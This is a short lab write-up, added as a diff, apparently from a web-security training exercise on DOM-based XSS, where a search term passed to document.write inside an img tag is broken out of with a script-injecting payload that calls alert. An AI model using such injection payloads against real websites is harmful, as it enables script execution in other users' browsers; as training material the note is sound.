@@ -1,0 +1,19 @@
+LAB 03: DOM XSS USING document.write using source location.search
+
+TARGET: FIND XSS to call alert function
+
+ANALYSIS: 
+
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+
+==> It's providing my search term in that fashion.
+
+<img src="/resources/images/tracker.gif?searchTerms='+query+'">
+
+<img src="/resources/images/tracker.gif?searchTerms=rabin">
+
+==> Now, I can put a payload here hai,i.e first I have to be out of <img tag.
+
+    "><script>alert("hacked");</script>{This is our final payload}
+
+    <img src="/resources/images/tracker.gif?searchTerms= "><script>alert("hacked");</script>">
